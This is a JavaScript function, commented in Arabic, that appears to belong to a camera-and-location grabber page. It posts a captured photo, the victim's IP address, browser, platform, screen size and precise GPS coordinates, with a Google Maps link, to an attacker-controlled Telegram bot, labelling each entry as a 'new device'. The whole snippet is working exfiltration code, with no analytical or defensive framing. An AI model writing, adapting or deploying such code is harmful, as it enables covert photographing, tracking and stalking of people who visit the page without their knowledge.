function sendToTelegram(imgBase64, ua, plat, res, ip, loc) { // 1. إرسال الصورة كملف (باستخدام Blob) const blob = dataURLToBlob(imgBase64); const formData = new FormData(); formData.append('chat_id', CHAT_ID); formData.append('photo', blob, 'capture.jpg'); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }) .then(response => response.json()) .then(data => { console.log('✅ تم إرسال الصورة:', data); if (!data.ok) { alert('❌ فشل إرسال الصورة: ' + data.description); } }) .catch(error => { console.error('❌ خطأ في إرسال الصورة:', error); alert('❌ فشل الاتصال بالبوت. تأكد من التوكن و Chat ID.'); }); // 2. إرسال النص بالبيانات const locationText = `📍 **الموقع:**\n` + `خط العرض: ${loc.lat}\n` + `خط الطول: ${loc.lon}\n` + `الدقة: ${loc.accuracy}`; const text = `📱 **جهاز جديد**\n` + `🆔 IP: ${ip}\n` + `📟 المتصفح: ${ua}\n` + `💻 المنصة: ${plat}\n` + `📏 الشاشة: ${res}\n` + `🕒 الوقت: ${new Date().toISOString()}\n\n` + `${locationText}\n\n` + `📍 رابط الخريطة: https://www.google.com/maps?q=${loc.lat},${loc.lon}`; fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown', disable_web_page_preview: true }) }) .then(response => response.json()) .then(data => { console.log('✅ تم إرسال النص:', data); if (!data.ok) { alert('❌ فشل إرسال النص: ' + data.description); } }) .catch(error => { console.error('❌ خطأ في إرسال النص:', error); alert('❌ فشل الاتصال بالبوت. تأكد من التوكن و Chat ID.'); }); }
